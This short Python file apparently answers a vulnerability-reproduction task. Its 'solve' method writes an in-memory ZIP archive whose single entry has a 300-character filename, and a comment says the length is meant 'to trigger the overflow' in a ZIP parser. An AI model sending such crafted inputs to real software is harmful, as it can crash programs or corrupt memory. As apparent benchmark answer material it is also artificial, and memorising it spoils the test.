import io
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf = io.BytesIO()
        filename = "A" * 300  # >256 to trigger the overflow
        with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_STORED) as zf:
            zf.writestr(filename, b"x")
        return buf.getvalue()
